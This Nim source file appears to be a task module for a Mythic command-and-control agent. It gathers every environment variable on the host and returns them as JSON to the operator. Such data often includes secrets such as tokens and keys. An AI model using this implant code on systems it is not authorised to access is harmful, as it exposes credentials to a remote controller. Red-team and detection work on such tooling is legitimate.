import ../utils/mythic_responses
import ../utils/debug
import std/[json, os, strformat]

proc getenv*(taskId: string, params: JsonNode): JsonNode =
  ## Get all environment variables
  
  try:
    debug "[DEBUG] GetEnv: Getting all environment variables"
    
    var envList = newJArray()
    
    # Iterate over all environment variables
    for key, value in envPairs():
      var envPair = %*{
        "key": key,
        "value": value
      }
      envList.add(envPair)
    
    debug "[DEBUG] GetEnv: Found ", envList.len, " environment variables"
    
    # Convert to string for output
    let output = $envList
    
    return mythicSuccess(taskId, output)
    
  except Exception as e:
    return mythicError(taskId, &"GetEnv error: {e.msg}")
